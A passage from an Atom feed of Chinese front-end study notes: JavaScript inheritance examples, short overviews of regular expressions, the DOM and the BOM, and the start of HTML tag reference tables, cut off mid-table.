        <span>this</span><span>.</span>property <span>=</span> <span>true</span><span>;</span>
    <span>}</span>
    <span>SuperType</span><span>.</span>prototype <span>=</span> <span>{</span>
        <span>constructor</span><span>:</span> SuperType<span>,</span> <span>// 保持构造函数和原型对象的完整性</span>
        <span>age</span><span>:</span> <span>15</span><span>,</span>
        <span>getSuperValue</span><span>:</span> <span>function</span> <span>(</span><span>)</span> <span>{</span>
            <span>return</span> <span>this</span><span>.</span>property<span>;</span>
        <span>}</span>
    <span>}</span><span>;</span>
    <span>function</span> <span>SubType</span><span>(</span><span>)</span> <span>{</span>
        <span>this</span><span>.</span>property <span>=</span> <span>false</span><span>;</span>
    <span>}</span>

    <span>SubType</span><span>.</span>prototype <span>=</span> <span>{</span>
        <span>constructor</span><span>:</span> SuperType<span>,</span>
        <span>getSubType</span><span>:</span> <span>function</span> <span>(</span><span>)</span> <span>{</span>
            <span>return</span> <span>this</span><span>.</span>property<span>;</span>
        <span>}</span>
    <span>}</span><span>;</span>

    <span>// 重写子类的原型指向父类的实例：继承父类的原型</span>
    <span>SubType</span><span>.</span>prototype <span>=</span> <span>new</span> <span>SuperType</span><span>(</span><span>)</span><span>;</span>

    <span>// 优点验证</span>
    <span>let</span> son <span>=</span> <span>new</span> <span>SubType</span><span>(</span><span>)</span><span>;</span>
    console<span>.</span><span>log</span><span>(</span>son<span>.</span>age<span>,</span> son<span>.</span>property<span>)</span><span>;</span> <span>// 15</span>
    console<span>.</span><span>log</span><span>(</span>son<span>.</span><span>getSuperValue</span><span>(</span><span>)</span><span>)</span><span>;</span> <span>// false</span>

    <span>// 缺点验证</span>
    <span>let</span> instance1 <span>=</span> <span>new</span> <span>SubType</span><span>(</span><span>)</span><span>;</span>
    instance1<span>.</span>city<span>.</span><span>push</span><span>(</span><span>"重庆"</span><span>)</span><span>;</span>
    console<span>.</span><span>log</span><span>(</span>instance1<span>.</span>city<span>)</span><span>;</span> <span>// ["北京", "上海", "天津", "重庆"]</span>

    <span>let</span> instance2 <span>=</span> <span>new</span> <span>SubType</span><span>(</span><span>)</span><span>;</span>
    console<span>.</span><span>log</span><span>(</span>instance2<span>.</span>city<span>)</span><span>;</span> <span>// ["北京", "上海", "天津", "重庆"]</span>

<span>}</span>
<span>test1</span><span>(</span><span>)</span><span>;</span>


<span>/**
 *   2. 构造函数继承
 */</span>
<span>function</span> <span>test2</span><span>(</span><span>)</span> <span>{</span>
    <span>function</span> <span>SuperType</span><span>(</span><span>name</span><span>)</span> <span>{</span>
        <span>this</span><span>.</span>name <span>=</span> name<span>;</span>
        <span>this</span><span>.</span>city <span>=</span> <span>[</span><span>"北京"</span><span>,</span> <span>"上海"</span><span>,</span> <span>"天津"</span><span>]</span>
    <span>}</span>
    <span>SuperType</span><span>.</span>prototype <span>=</span> <span>{</span>
        <span>constructor</span><span>:</span> SuperType<span>,</span>
        <span>age</span><span>:</span> <span>18</span><span>,</span>
        <span>showInfo</span><span>:</span> <span>function</span> <span>(</span><span>)</span> <span>{</span>
            <span>return</span> <span>this</span><span>.</span>name<span>;</span>
        <span>}</span>
    <span>}</span><span>;</span>

    <span>function</span> <span>SubType</span><span>(</span><span>)</span> <span>{</span>
        <span>// 父类调用call()或者apply()方法和子类共用同一个this，实现子类实例属性的继承</span>
        <span>SuperType</span><span>.</span><span>call</span><span>(</span><span>this</span><span>,</span> <span>"张三"</span><span>)</span><span>;</span>
    <span>}</span>

    <span>// 优点验证</span>
    <span>let</span> instance <span>=</span> <span>new</span> <span>SubType</span><span>(</span><span>)</span><span>;</span>
    instance<span>.</span>city<span>.</span><span>push</span><span>(</span><span>"重庆"</span><span>)</span><span>;</span>
    console<span>.</span><span>log</span><span>(</span>instance<span>.</span>city<span>)</span><span>;</span> <span>// ["北京", "上海", "天津", "重庆"]</span>

    <span>let</span> instance1 <span>=</span> <span>new</span> <span>SubType</span><span>(</span><span>)</span><span>;</span>
    console<span>.</span><span>log</span><span>(</span>instance1<span>.</span>city<span>)</span><span>;</span> <span>// ["北京", "上海", "天津"]</span>

    <span>// 缺点验证</span>
    console<span>.</span><span>log</span><span>(</span>instance<span>.</span>age<span>)</span><span>;</span> <span>// undefined</span>
    instance<span>.</span><span>showInfo</span><span>(</span><span>)</span><span>;</span> <span>// son.showInfo is not a function</span>
<span>}</span>
<span>// test2();</span>


<span>/**
 *   3. 组合继承
 */</span>
<span>function</span> <span>test3</span><span>(</span><span>)</span> <span>{</span>
    <span>function</span> <span>SuperType</span><span>(</span><span>name</span><span>)</span> <span>{</span>
        <span>this</span><span>.</span>name <span>=</span> name<span>;</span>
        <span>this</span><span>.</span>city <span>=</span> <span>[</span><span>"北京"</span><span>,</span> <span>"上海"</span><span>,</span> <span>"天津"</span><span>]</span>
    <span>}</span>
    <span>SuperType</span><span>.</span>prototype <span>=</span> <span>{</span>
        <span>constructor</span><span>:</span> SuperType<span>,</span>
        <span>showInfo</span><span>:</span> <span>function</span> <span>(</span><span>)</span> <span>{</span>
            console<span>.</span><span>log</span><span>(</span><span>this</span><span>.</span>name <span>+</span> <span>"今年"</span> <span>+</span> <span>this</span><span>.</span>age <span>+</span> <span>"岁了"</span><span>)</span><span>;</span>
        <span>}</span>
    <span>}</span><span>;</span>

    <span>function</span> <span>SubType</span><span>(</span><span>name<span>,</span> age</span><span>)</span> <span>{</span>
        <span>// 1. 通过构造方法继承实现实例属性的继承</span>
        <span>SuperType</span><span>.</span><span>call</span><span>(</span><span>this</span><span>,</span> name<span>)</span><span>;</span>
        <span>this</span><span>.</span>age <span>=</span> age<span>;</span>
    <span>}</span>

    <span>// 2. 通过原型链继承实现原型方法的继承</span>
    <span>SubType</span><span>.</span>prototype <span>=</span> <span>new</span> <span>SuperType</span><span>(</span><span>)</span><span>;</span>

    <span>// 优点验证</span>
    <span>let</span> instance <span>=</span> <span>new</span> <span>SubType</span><span>(</span><span>"张三"</span><span>,</span> <span>15</span><span>)</span><span>;</span>
    instance<span>.</span><span>showInfo</span><span>(</span><span>)</span><span>;</span> <span>// 张三今年15岁了</span>

    <span>let</span> instance1 <span>=</span> <span>new</span> <span>SubType</span><span>(</span><span>)</span><span>;</span>
    instance1<span>.</span>city<span>.</span><span>push</span><span>(</span><span>"重庆"</span><span>)</span><span>;</span>
    console<span>.</span><span>log</span><span>(</span>instance1<span>.</span>city<span>)</span><span>;</span> <span>// ["北京", "上海", "天津", "重庆"]</span>

    <span>let</span> instance2 <span>=</span> <span>new</span> <span>SubType</span><span>(</span><span>)</span><span>;</span>
    console<span>.</span><span>log</span><span>(</span>instance2<span>.</span>city<span>)</span><span>;</span> <span>// ["北京", "上海", "天津"]</span>

<span>}</span>
<span>// test3();</span>


<span>/*
 *   4. 寄生组合式继承
 */</span>
<span>function</span> <span>test4</span><span>(</span><span>)</span> <span>{</span>
    <span>function</span> <span>inheritPrototype</span><span>(</span><span>subType<span>,</span> superType</span><span>)</span> <span>{</span>
        <span>// 1. 继承父类的原型</span>
        <span>var</span> prototype <span>=</span> Object<span>.</span><span>create</span><span>(</span>superType<span>.</span>prototype<span>)</span><span>;</span>
        <span>// 2. 重写被污染的construct</span>
        prototype<span>.</span>constructor <span>=</span> subType<span>;</span>
        <span>// 3. 重写子类的原型</span>
        subType<span>.</span>prototype <span>=</span> prototype<span>;</span>
    <span>}</span>
    <span>function</span> <span>SuperType</span><span>(</span><span>name</span><span>)</span> <span>{</span>
        <span>this</span><span>.</span>name <span>=</span> name<span>;</span>
        <span>this</span><span>.</span>city <span>=</span> <span>[</span><span>"北京"</span><span>,</span> <span>"上海"</span><span>,</span> <span>"天津"</span><span>]</span><span>;</span>
    <span>}</span>

    <span>SuperType</span><span>.</span>prototype<span>.</span><span>sayName</span> <span>=</span> <span>function</span> <span>(</span><span>)</span> <span>{</span>
        console<span>.</span><span>log</span><span>(</span><span>this</span><span>.</span>name<span>)</span><span>;</span>
    <span>}</span><span>;</span>

    <span>function</span> <span>SubType</span><span>(</span><span>name<span>,</span> age</span><span>)</span> <span>{</span>
        <span>SuperType</span><span>.</span><span>call</span><span>(</span><span>this</span><span>,</span> name<span>)</span><span>;</span>
        <span>this</span><span>.</span>age <span>=</span> age<span>;</span>
    <span>}</span>

    <span>// 将父类原型指向子类</span>
    <span>inheritPrototype</span><span>(</span>SubType<span>,</span> SuperType<span>)</span><span>;</span>

    <span>SubType</span><span>.</span>prototype<span>.</span><span>sayAge</span> <span>=</span> <span>function</span> <span>(</span><span>)</span> <span>{</span>
        console<span>.</span><span>log</span><span>(</span><span>this</span><span>.</span>age<span>)</span><span>;</span>
    <span>}</span>

    <span>// 优点验证</span>
    <span>let</span> instance <span>=</span> <span>new</span> <span>SubType</span><span>(</span><span>"张三"</span><span>,</span> <span>15</span><span>)</span><span>;</span>
    instance<span>.</span><span>sayName</span><span>(</span><span>)</span><span>;</span> <span>// 张三</span>

    <span>let</span> instance1 <span>=</span> <span>new</span> <span>SubType</span><span>(</span><span>)</span><span>;</span>
    instance1<span>.</span>city<span>.</span><span>push</span><span>(</span><span>"重庆"</span><span>)</span><span>;</span>
    console<span>.</span><span>log</span><span>(</span>instance1<span>.</span>city<span>)</span><span>;</span> <span>// ["北京", "上海", "天津", "重庆"]</span>

    <span>let</span> instance2 <span>=</span> <span>new</span> <span>SubType</span><span>(</span><span>)</span><span>;</span>
    console<span>.</span><span>log</span><span>(</span>instance2<span>.</span>city<span>)</span><span>;</span> <span>// ["北京", "上海", "天津"]</span>
<span>}</span>
<span>// test4();</span>

<span>function</span> <span>test5</span><span>(</span><span>)</span> <span>{</span>
    <span>class</span> <span>SuperType</span> <span>{</span>
        <span>// 构造方法，只能有一个</span>
        <span>constructor</span><span>(</span><span>name<span>,</span> age</span><span>)</span> <span>{</span>
            <span>this</span><span>.</span>name <span>=</span> name<span>;</span>
            <span>this</span><span>.</span>age <span>=</span> age<span>;</span>
        <span>}</span>

        <span>toString</span><span>(</span><span>)</span> <span>{</span>
            console<span>.</span><span>log</span><span>(</span><span>this</span><span>.</span>name <span>+</span> <span>"今年"</span> <span>+</span> <span>this</span><span>.</span>age <span>+</span> <span>"岁了"</span><span>)</span><span>;</span>
        <span>}</span>
    <span>}</span>

    <span>class</span> <span>SubType</span> <span>extends</span> <span>SuperType</span> <span>{</span>
        <span>// 子类必须继承父类构造方法</span>
        <span>constructor</span><span>(</span><span>name<span>,</span> age</span><span>)</span> <span>{</span>
            <span>// 调用父类构造方法，只能在第一行</span>
            <span>super</span><span>(</span>name<span>,</span> age<span>)</span><span>;</span>
        <span>}</span>
    <span>}</span>

    <span>var</span> obj <span>=</span> <span>new</span> <span>SubType</span><span>(</span><span>"张三"</span><span>,</span> <span>15</span><span>)</span><span>;</span>
    obj<span>.</span><span>toString</span><span>(</span><span>)</span><span>;</span> <span>// 张三今年15岁了</span>
    <span>// 验证第一条</span>
    console<span>.</span><span>log</span><span>(</span>obj<span>.</span>toString <span>===</span> <span>SuperType</span><span>.</span>prototype<span>.</span>toString<span>)</span><span>;</span> <span>// true</span>
    <span>// 验证第二条</span>
    console<span>.</span><span>log</span><span>(</span>SubType<span>.</span>__proto__<span>)</span><span>;</span> <span>// class SuperType</span>
    <span>// 验证第三条</span>
    console<span>.</span><span>log</span><span>(</span><span>SubType</span><span>.</span>prototype<span>.</span>__proto__<span>)</span><span>;</span> <span>// {constructor: ƒ, toString: ƒ}</span>
    <span>// 验证第四条</span>
    <span>class</span> <span>A</span> <span>extends</span> <span>Object</span> <span>{</span> <span>}</span>
    <span>class</span> <span>B</span> <span>extends</span> <span>null</span><span>{</span> <span>}</span>
    console<span>.</span><span>log</span><span>(</span><span>A</span><span>.</span>__proto__ <span>===</span> Object<span>)</span><span>;</span> <span>// true</span>
    console<span>.</span><span>log</span><span>(</span><span>A</span><span>.</span>prototype<span>.</span>__proto__ <span>===</span> <span>Object</span><span>.</span>prototype<span>)</span><span>;</span> <span>// true</span>
    console<span>.</span><span>log</span><span>(</span><span>B</span><span>.</span>__proto__ <span>===</span> <span>Function</span><span>.</span>prototype<span>)</span><span>;</span> <span>// true</span>
    console<span>.</span><span>log</span><span>(</span><span>B</span><span>.</span>prototype<span>.</span>__proto__ <span>===</span> <span>undefined</span><span>)</span><span>;</span> <span>// true</span>
<span>}</span>
<span>// test5()</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br><span>78</span><br><span>79</span><br><span>80</span><br><span>81</span><br><span>82</span><br><span>83</span><br><span>84</span><br><span>85</span><br><span>86</span><br><span>87</span><br><span>88</span><br><span>89</span><br><span>90</span><br><span>91</span><br><span>92</span><br><span>93</span><br><span>94</span><br><span>95</span><br><span>96</span><br><span>97</span><br><span>98</span><br><span>99</span><br><span>100</span><br><span>101</span><br><span>102</span><br><span>103</span><br><span>104</span><br><span>105</span><br><span>106</span><br><span>107</span><br><span>108</span><br><span>109</span><br><span>110</span><br><span>111</span><br><span>112</span><br><span>113</span><br><span>114</span><br><span>115</span><br><span>116</span><br><span>117</span><br><span>118</span><br><span>119</span><br><span>120</span><br><span>121</span><br><span>122</span><br><span>123</span><br><span>124</span><br><span>125</span><br><span>126</span><br><span>127</span><br><span>128</span><br><span>129</span><br><span>130</span><br><span>131</span><br><span>132</span><br><span>133</span><br><span>134</span><br><span>135</span><br><span>136</span><br><span>137</span><br><span>138</span><br><span>139</span><br><span>140</span><br><span>141</span><br><span>142</span><br><span>143</span><br><span>144</span><br><span>145</span><br><span>146</span><br><span>147</span><br><span>148</span><br><span>149</span><br><span>150</span><br><span>151</span><br><span>152</span><br><span>153</span><br><span>154</span><br><span>155</span><br><span>156</span><br><span>157</span><br><span>158</span><br><span>159</span><br><span>160</span><br><span>161</span><br><span>162</span><br><span>163</span><br><span>164</span><br><span>165</span><br><span>166</span><br><span>167</span><br><span>168</span><br><span>169</span><br><span>170</span><br><span>171</span><br><span>172</span><br><span>173</span><br><span>174</span><br><span>175</span><br><span>176</span><br><span>177</span><br><span>178</span><br><span>179</span><br><span>180</span><br><span>181</span><br><span>182</span><br><span>183</span><br><span>184</span><br><span>185</span><br><span>186</span><br><span>187</span><br><span>188</span><br><span>189</span><br><span>190</span><br><span>191</span><br><span>192</span><br><span>193</span><br><span>194</span><br><span>195</span><br><span>196</span><br><span>197</span><br><span>198</span><br><span>199</span><br><span>200</span><br><span>201</span><br><span>202</span><br><span>203</span><br><span>204</span><br></div></div><h2 id="正则表达式" tabindex="-1"> 正则表达式</h2>
<p><strong>正则表达式</strong>(regular expression)描述了一种字符串匹配的模式（pattern），通常被用来检索、替换那些符合某个模式(规则)的文本。</p>
<p><img src="@source/assets/cs-note/preface/basic/regular-expression.png" alt="" loading="lazy"></p>
<h1 id="javascript-dom" tabindex="-1"> JavaScript DOM</h1>
<h2 id="简介" tabindex="-1"> 简介</h2>
<p><strong>文档对象模型</strong>（Document Object Model，简称DOM），是针对HTML和XML文档的一个API（应用程序接口），将 HTML 文档呈现为带有元素、属性和文本的树结构，即节点树</p>
<p><strong>作用</strong>：JavaScript通过DOM能够改变页面中所有的HTML 元素、属性和 CSS 样式，并对页面中所有事件做出响应。</p>
<p><strong>结构图</strong></p>
<p><img src="@source/assets/cs-note/preface/basic/js-dom结构.png" alt="" loading="lazy"></p>
<h2 id="节点树" tabindex="-1"> 节点树</h2>
<h3 id="节点类型及属性" tabindex="-1"> 节点类型及属性</h3>
<p><img src="@source/assets/cs-note/preface/basic/js-dom节点类型及属性.png" alt="" loading="lazy"></p>
<h3 id="文档节点-document对象" tabindex="-1"> 文档节点(Document对象)</h3>
<p>document类型属性
<img src="@source/assets/cs-note/preface/basic/js-document类型属性.png" alt="" loading="lazy"></p>
<p>document类型方法
<img src="@source/assets/cs-note/preface/basic/js-document类型方法.png" alt="" loading="lazy"></p>
<h3 id="元素节点-element对象" tabindex="-1"> 元素节点(Element对象)</h3>
<p><img src="@source/assets/cs-note/preface/basic/js-Element对象.png" alt="" loading="lazy"></p>
<h3 id="属性节点-attr对象" tabindex="-1"> 属性节点(Attr对象)</h3>
<p><img src="@source/assets/cs-note/preface/basic/js-Attr对象.png" alt="" loading="lazy"></p>
<h3 id="文本节点-text" tabindex="-1"> 文本节点(Text)</h3>
<p><img src="@source/assets/cs-note/preface/basic/js-Text.png" alt="" loading="lazy"></p>
<h2 id="事件" tabindex="-1"> 事件</h2>
<p><strong>概述</strong>：事件一般是用于浏览器和用户操作进行交互，当用户执行某些操作的时候才会执行特定的代码，例如单击图片等</p>
<h3 id="事件流" tabindex="-1"> 事件流</h3>
<p>事件发生时会在元素节点与根节点之间按照特定的顺序传播，路径所经过的所有节点都会收到该事件，这个传播过程即DOM事件流</p>
<p><img src="@source/assets/cs-note/preface/basic/js-dom事件流.png" alt="" loading="lazy"></p>
<h4 id="捕获阶段" tabindex="-1"> 捕获阶段</h4>
<p>捕获阶段处于事件流的第一阶段，开始于Document，结束于目标阶段，主要作用是捕获截取事件。</p>
<h4 id="目标阶段" tabindex="-1"> 目标阶段</h4>
<p>目标阶段处于事件流的第二阶段，具有双重范围，即捕获阶段的结束，冒泡阶段的开始，主要作用是执行绑定事件。</p>
<h4 id="冒泡阶段" tabindex="-1"> 冒泡阶段</h4>
<p>冒泡阶段处于事件流的第三阶段，开始于目标元素，结束于Document，主要作用是将目标元素绑定事件执行的结果返回给浏览器，处理不同浏览器之间的差异。</p>
<h3 id="事件处理程序" tabindex="-1"> 事件处理程序</h3>
<ol>
<li>
<p>HTML事件处理程序</p>
<ul>
<li>优点：事件处理程序中的代码，能够访问全局作用域中的任何变量</li>
<li>缺点：时差问题、扩展的作用域链在不同浏览器中会导致不同结果、html代码与js代码高度耦合</li>
</ul>
</li>
<li>
<p>DOM0级事件处理程序</p>
<ul>
<li>优点：简单和浏览器兼容性好，解决了html代码和js代码的高度耦合</li>
<li>缺点：一个元素只能绑定一个事件处理函数，只会在事件冒泡中运行</li>
</ul>
</li>
<li>
<p>DOM2级事件处理程序</p>
<ul>
<li>优点：同时支持事件处理的捕获和冒泡阶段，并且一个元素可以绑定多个处理函数</li>
<li>缺点：IE不支持</li>
</ul>
</li>
<li>
<p>跨浏览器处理程序</p>
<ul>
<li>优点：继承了DOM2级事件处理程序的优点，并且可以解决其缺点</li>
</ul>
</li>
</ol>
<h3 id="事件处理函数" tabindex="-1"> 事件处理函数</h3>
<h4 id="鼠标键盘事件" tabindex="-1"> 鼠标键盘事件</h4>
<p><img src="@source/assets/cs-note/preface/basic/js-dom鼠标键盘事件.png" alt="" loading="lazy"></p>
<h4 id="页面窗口事件" tabindex="-1"> 页面窗口事件</h4>
<p><img src="@source/assets/cs-note/preface/basic/js-dom页面窗口事件.png" alt="" loading="lazy"></p>
<h4 id="表单事件" tabindex="-1"> 表单事件</h4>
<p><img src="@source/assets/cs-note/preface/basic/js-dom表单事件.png" alt="" loading="lazy"></p>
<h1 id="javascript-bom" tabindex="-1"> JavaScript BOM</h1>
<p><strong>概念</strong>：浏览器对象模型（Browser Object Model，简称BOM），描述与浏览器进行交互的方法和接口，和网页内容无关</p>
<p><strong>作用</strong>：管理窗口和窗口之间的通讯</p>
<p><strong>结构图</strong>
<img src="@source/assets/cs-note/preface/basic/js-bom结构.png" alt="" loading="lazy"></p>
<h2 id="window-对象" tabindex="-1"> window 对象</h2>
<p><strong>BOM的核心对象就是window</strong>，window对象也是BOM的顶级对象，所有浏览器都支持window对象，它代表的是浏览器的窗口。JavaScript的所有全局对象、</p>
<p>全局方法和全局变量全都自动被归为window对象的方法和属性，在调用这些方法和属性的时候可以省略window</p>
<p><img src="@source/assets/cs-note/preface/basic/js-bom-window对象.png" alt="" loading="lazy"></p>
<h2 id="其他对象" tabindex="-1"> 其他对象</h2>
<h3 id="frames" tabindex="-1"> frames</h3>
<p>如果页面包含框架，则每个框架都有自己的window对象，并且保存frames集合中，可以通过数值索引或框架名称来访问相应的window对象</p>
<h3 id="history" tabindex="-1"> history</h3>
<p>history对象保存着用户上网的历史记录，从窗口被打开的一刻算起</p>
<ul>
<li>back( )：加载 history 对象列表中的前一个URL</li>
<li>forward( )：加载 history 对象列表中的下一个URL</li>
</ul>
<h3 id="location" tabindex="-1"> location</h3>
<p>location对象提供了与当前窗口加载的文档有关的信息，还提供了一些导航功能</p>
<ul>
<li>replace()方法：用户不能回到前一个页面</li>
<li>reload()方法：重新加载当前显示的页面</li>
</ul>
<h3 id="screen" tabindex="-1"> screen</h3>
<p>screen对象基本上只用来表明客户端的能力，其中包括浏览器窗口外部的显示器的信息，如像素宽度和高度等</p>
<h3 id="navigator" tabindex="-1"> navigator</h3>
<p>navigator属性通常用于检测显示网页的浏览器类型。可以使用plugins数组检测浏览器是否安装了特定的插件</p>
<p>plugins数组的属性：</p>
<ul>
<li>name：插件名字</li>
<li>description：插件的描述</li>
<li>filename：插件的文件名</li>
<li>length：插件所处理的MIME类型数量</li>
</ul>
<h1 id="javascript-使用" tabindex="-1"> JavaScript 使用</h1>
<p>HTML 中的脚本必须位于 <code>&lt;script&gt;</code> 与 <code>&lt;/script&gt;</code> 标签之间。</p>
<p>脚本可被放置在 HTML 页面的 <code>&lt;body&gt;</code> 和 <code>&lt;head&gt;</code> 部分中。</p>
<p>也可以把脚本保存到外部文件中。外部文件通常包含被多个网页使用的代码。外部 JavaScript 文件的文件扩展名是 .js。如需使用外部文件，请在 <code>&lt;script&gt;</code> 标签的 &quot;src&quot; 属性中设置该 .js 文件;(外部脚本不能包含 <code>&lt;script&gt;</code> 标签)</p>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">前端</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%89%8D%E7%AB%AF/</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%89%8D%E7%AB%AF/"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">HTML</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%89%8D%E7%AB%AF/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%89%8D%E7%AB%AF/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li></li>
</ul>
</li>
</ul>

<h1 id="html" tabindex="-1"> HTML</h1>
<h2 id="html-简介" tabindex="-1"> HTML 简介</h2>
<p>超文本标记语言（英语：HyperText Markup Language，简称：HTML）是一种用于创建网页的标准标记语言。</p>
<p>HTML 是用来描述网页的一种语言。</p>
<ul>
<li>HTML 指的是超文本标记语言: HyperText Markup Language</li>
<li>HTML 不是一种编程语言，而是一种标记语言</li>
<li>标记语言是一套标记标签 (markup tag)</li>
<li>HTML 使用标记标签来描述网页</li>
<li>HTML 文档包含了HTML 标签及文本内容</li>
<li>HTML文档也叫做 web 页面</li>
</ul>
<h2 id="html-标签和元素" tabindex="-1"> HTML 标签和元素</h2>
<p>HTML 标记标签通常被称为 HTML 标签 (HTML tag)</p>
<p>&quot;HTML 标签&quot; 和 &quot;HTML 元素&quot; 通常都是描述同样的意思；但是严格来讲, 一个 HTML 元素包含了开始标签与结束标签</p>
<h3 id="基本元素标签" tabindex="-1"> 基本元素标签</h3>
<table>
<thead>
<tr>
<th>标签</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>&lt;!--...--&gt;</code></td>
<td>用于定义HTML注释</td>
</tr>
<tr>
<td><code>&lt;html&gt;</code></td>
<td>HTML文档的根元素</td>
</tr>
<tr>
<td><code>&lt;head&gt;</code></td>
<td>定义了文档的信息</td>
</tr>
<tr>
<td><code>&lt;body&gt;</code></td>
<td>定义HTML的主体部分，可以指定通用属性和事件属性</td>
</tr>
</tbody>
</table>
<h3 id="用途分类" tabindex="-1"> 用途分类</h3>
<h4 id="布局类标签" tabindex="-1"> 布局类标签</h4>
<p><strong>作用</strong>：用于网页布局</p>
<table>
<thead>
<tr>
<th>标签</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>&lt;html&gt;</code></td>
<td>结构</td>
</tr>
<tr>
<td><code>&lt;head&gt;</code></td>
<td>头部</td>
</tr>
<tr>
<td><code>&lt;body&gt;</code></td>
<td>主体</td>
</tr>
<tr>
<td><code>&lt;header&gt;</code></td>
<td>头部标签</td>
</tr>
<tr>
<td><code>&lt;nav&gt;</code></td>
<td>导航标签</td>
</tr>
<tr>
<td><code>&lt;main&gt;</code></td>
<td>中部标签</td>
</tr>
<tr>
<td><code>&lt;section&gt;</code></td>
<td>中部标签(不常用)</td>
</tr>
<tr>
<td><code>&lt;footer&gt;</code></td>
<td>尾部标签</td>
</tr>
</tbody>
</table>
<h4 id="html-头部" tabindex="-1"> HTML 头部</h4>
<p><code>&lt;head&gt;</code> 元素包含了所有的头部标签元素。在 <code>&lt;head&gt;</code>元素中你可以插入脚本（scripts）, 样式文件（CSS），及各种meta信息。
可以添加在头部区域的元素标签为: <code>&lt;title&gt;</code>, <code>&lt;style&gt;</code>, <code>&lt;meta&gt;</code>, <code>&lt;link&gt;</code>, <code>&lt;script&gt;</code>, <code>&lt;noscript&gt;</code>, and <code>&lt;base&gt;</code>.</p>
<table>
<thead>
<tr>
<th>标签</th>
<th>描述</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>&lt;head&gt;</code></td>
<td>定义了文档的信息</td>
<td>包含了所有的头部标签元素</td>
</tr>
<tr>
<td><code>&lt;title&gt;</code></td>
<td>定义了文档的标题</td>
<td>定义了浏览器工具栏的标题</td>
</tr>
<tr>
<td><code>&lt;base&gt;</code></td>
<td>定义了页面链接标签的默认链接地址</td>
<td>作为HTML文档中所有的链接标签的默认链接</td>
</tr>
<tr>
<td><code>&lt;link&gt;</code></td>
<td>定义了一个文档和外部资源之间的关系</td>
<td>通常用于链接到样式表</td>
</tr>
<tr>
<td><code>&lt;meta&gt;</code></td>
<td>定义了HTML文档中的元数据</td>
<td>通常用于指定网页的描述；使用于浏览器（如何显示内容或重新加载页面），搜索引擎（关键词），或其他Web服务。</td>
</tr>
<tr>
<td><code>&lt;script&gt;</code></td>
<td>定义了客户端的脚本文件</td>
<td>用于加载脚本文件</td>
</tr>
<tr>
<td><code>&lt;style&gt;</code></td>
<td>定义了HTML文档的样式文件</td>
<td>定义HTML文档样式文件引用地址，也可以直接添加样式</td>
</tr>
</tbody>
</table>
<h4 id="图片类标签" tabindex="-1"> 图片类标签</h4>
<p>在 HTML 中，图像由<code>&lt;img&gt;</code> 标签定义。</p>
<p><code>&lt;img&gt;</code> 是空标签，意思是说，它只包含属性，并且没有闭合标签。</p>
<ul>
<li>src src 指 &quot;source&quot;。源属性的值是图像的 URL 地址。</li>
<li>alt 属性用来为图像定义一串预备的可替换的文本。</li>
<li>height（高度） 与 width（宽度）属性用于设置图像的高度与宽度。</li>
</ul>
<h4 id="链接类标签" tabindex="-1"> 链接类标签</h4>
<p>HTML使用标签 <code>&lt;a&gt;</code>来设置超文本链接。</p>
<ul>
<li>使用了href属性来描述链接的地址；</li>
<li>使用 target 属性，你可以定义被链接的文档在何处显示。</li>
<li>id属性可用于创建在一个HTML文档书签标记。</li>
</ul>
<h4 id="表格类标签" tabindex="-1"> 表格类标签</h4>
<table>
<thead>
<tr>
<th>标签</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>&lt;table&gt;</code></td>
<td>定义表格</td>
</tr>
<tr>
<td><code>&lt;th&gt;</code></td>
<td>定义表格的表头</td>
</tr>
<tr>
<td><code>&lt;tr&gt;</code></td>
<td>定义表格的行</td>
</tr>
<tr>
<td><code>&lt;td&gt;</code></td>
<td>定义表格单元</td>
</tr>
<tr>
<td><code>&lt;caption&gt;</code></td>
<td>定义表格标题</td>
</tr>
<tr>
<td><code>&lt;colgroup&gt;</code></td>
<td>定义表格列的组</td>
</tr>
<tr>
<td><code>&lt;col&gt;</code></td>
<td>定义用于表格列的属性</td>
</tr>
<tr>
<td><code>&lt;thead&gt;</code></td>
<td>定义表格的页眉</td>
</tr>
<tr>
<td><code>&lt;tbody&gt;</code></td>
<td>定义表格的主体</td>
